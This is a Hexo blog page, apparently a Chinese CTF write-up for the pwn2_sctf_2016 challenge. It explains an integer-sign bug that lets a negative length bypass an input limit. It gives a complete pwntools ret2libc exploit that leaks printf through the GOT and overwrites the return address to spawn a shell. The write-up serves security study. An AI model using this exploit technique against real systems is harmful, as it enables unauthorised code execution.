@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1">
+  
+  <title>pwn2_sctf_2016 - 8023</title>
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    <link rel='manifest' href='/manifest.json'>
+  
+
+  
+<link rel="stylesheet" href="/css/var.css">
+
+  
+<link rel="stylesheet" href="/css/main.css">
+
+  
+<link rel="stylesheet" href="/css/typography.css">
+
+  
+<link rel="stylesheet" href="/css/code-highlighting.css">
+
+  
+<link rel="stylesheet" href="/css/components.css">
+
+  
+<link rel="stylesheet" href="/css/nav.css">
+
+  
+<link rel="stylesheet" href="/css/paginator.css">
+
+  
+<link rel="stylesheet" href="/css/footer.css">
+
+  
+<link rel="stylesheet" href="/css/post-list.css">
+
+  
+<link rel="stylesheet" href="/css/waline.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/post.css">
+
+  
+
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+    <body>
+        <nav id="theme-nav">
+    <div class="inner">
+        <a class="title" href="/">Blog</a>
+        <div class="nav-arrow"></div>
+        <div class="nav-items">
+            <a class="nav-item nav-item-home" href="/">Home</a>
+            
+            
+            <a class="nav-item" href="/archives">Archives</a>
+            
+            
+            
+            <a class="nav-item" href="/friends">Friends</a>
+            
+            
+            
+            <a class="nav-item" href="/projects">Projects</a>
+            
+            
+            
+            <a class="nav-item" href="/about">About</a>
+            
+            
+            
+            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank">&nbsp;</a>
+            
+            
+        </div>
+    </div>
+</nav>
+        <article class="post">
+    <div class="meta">
+        
+        <div class="date" id="date">
+            
+            
+            
+            
+            
+            
+            
+            <span>July</span>
+            
+            
+            
+            
+            
+            
+            <span>6,</span>
+            <span>2021</span>
+        </div>
+        
+
+        <h2 class="title">pwn2_sctf_2016</h2>
+    </div>
+
+    <div class="divider"></div>
+
+    <div class="content">
+        <h1 id="pwn2-sctf-2016"><a href="#pwn2-sctf-2016" class="headerlink" title="pwn2_sctf_2016"></a>pwn2_sctf_2016</h1><p>检查保护机制，开了NX,32位</p>
+<p><img src="/img/image-20210627162616928.png" alt="image-20210627162616928"></p>
+<p>尝试运行了一下</p>
+<p><img src="/img/image-20210627162846304.png" alt="image-20210627162846304"></p>
+<p>IDA打开，main函数很简单，就调用了一个vuln()函数，那就看看vuln()函数</p>
+<p><img src="/img/image-20210627163205184.png" alt="image-20210627163205184"></p>
+<p><img src="/img/image-20210627163308598.png" alt="image-20210627163308598"></p>
+<p><img src="/img/image-20210627164147748.png" alt="image-20210627164147748"></p>
+<p>读出内容限制a2输入最大字节长度为32，接受a2个长度的字符串并放到vuln函数的缓冲区内部，但是a2传入的值类型是unsigned int，而前面判断长度的类型是int，可以规避长度限制。也就是说我们这边可以输入负数来达到溢出的效果（整数溢出）</p>
+<p>这里发现输入函数是get_n,而不是get，说明是自定义函数</p>
+<p>shift+F12查找字符串，没有看见system(‘/bin/sh’)字样</p>
+<p><img src="/img/image-20210627163859886.png" alt="image-20210627163859886"></p>
+<h3 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h3><p>1.通过输入负数，绕过长度限制，造成溢出</p>
+<p>2.利用printf函数泄露程序的libc版本，算出system和‘/bin/sh’的地址</p>
+<p>3.溢出覆盖返回地址执行system(‘/bin/sh’)，夺权</p>
+<h3 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h3><p>整数溢出</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">r.recvuntil(<span class="string">&#x27;How many bytes do you want me to read?&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>泄露libc</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">r.recvuntil(<span class="string">&#x27;How many bytes do you want me to read?&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x2c</span>+<span class="number">4</span>)+p32(printf_plt)+p32(main)+p32(printf_got)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">printf_addr=u32(r.recv(<span class="number">4</span>))</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;printf&#x27;</span>,printf_addr)</span><br></pre></td></tr></table></figure>
+
+<p>算出system和’/bin/sh’的地址</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">offset=printf_addr-libc.dump(<span class="string">&#x27;printf&#x27;</span>)</span><br><span class="line">system=offset+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh=offset+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>覆盖返回地址，夺权</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">r.recvuntil(<span class="string">&#x27;How many bytes do you want me to read?&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x2c</span>+<span class="number">4</span>)+p32(system)+p32(main)+p32(bin_sh)</span><br><span class="line">r.sendline(payload)</span><br></pre></td></tr></table></figure>
+
+<h3 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25624</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn2_sctf_2016&#x27;</span>)</span><br><span class="line"></span><br><span class="line">printf_plt=elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">printf_got=elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">main=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;How many bytes do you want me to read? &#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x2c</span>+<span class="number">4</span>)+p32(printf_plt)+p32(main)+p32(printf_got)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">printf_addr=u32(r.recv(<span class="number">4</span>))</span><br><span class="line"><span class="comment">#libc=LibcSearcher(&#x27;printf&#x27;,printf_addr)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line">offset=printf_addr-libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">system=offset+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh=offset+ <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;How many bytes do you want me to read? &#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x2c</span>+<span class="number">4</span>)+p32(system)+p32(main)+p32(bin_sh)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20210706132149436.png" alt="image-20210706132149436"></p>
+
+    </div>
+
+    <div class="about">
+        <h1>About this Post</h1>
+        <p>This post is written by Pr0b1em, licensed under <a
+                target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
+    </div>
+
+    
+        
+    
+</article>
+        <footer>
+    <div class="inner">
+        <div class="links">
+            
+            <div class="group">
+                <h4 class="title">Blog</h4>
+                
+                <a href="/" class="item" target="_blank">Blog</a>
+                
+                <a href="/archives" class="item" target="_blank">Archives</a>
+                
+                <a href="/friends" class="item" target="_blank">Friends</a>
+                
+                <a href="/projects" class="item" target="_blank">Projects</a>
+                
+                <a href="/resume" class="item" target="_blank">Resume</a>
+                
+                <a href="/about" class="item" target="_blank">About</a>
+                
+                <a href="/atom.xml" class="item" target="_blank">RSS</a>
+                
+            </div>
+            
+            <div class="group">
+                <h4 class="title">Projects</h4>
+                
+                <a href="https://github.com/transmister" class="item" target="_blank">Transmister</a>
+                
+                <a href="https://github.com/MrWillCom/css-and-js-windows-uwp-xaml-controls" class="item" target="_blank">CSS&amp;JS Windows UWP XAML Controls</a>
+                
+                <a href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item" target="_blank">Theme Cupertino</a>
+                
+                <a href="https://github.com/MrWillCom/github-dark-mode" class="item" target="_blank">GitHub Dark Mode</a>
+                
+            </div>
+            
+            <div class="group">
+                <h4 class="title">Me</h4>
+                
+                <a href="https://github.com/MrWillCom" class="item" target="_blank">GitHub</a>
+                
+                <a href="https://codepen.io/mrwillcom" class="item" target="_blank">CodePen</a>
+                
+                <a href="https://www.patreon.com/MrWillCom" class="item" target="_blank">Patreon</a>
+                
+                <a href="mailto:mr.will.com@outlook.com" class="item" target="_blank">Email</a>
+                
+            </div>
+            
+        </div>
+        &copy; 2021 Pr0b1em<br />
+        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+</footer>
+
+        
+<script src="/js/main.js"></script>
+
+        
+    </body>
+</html>
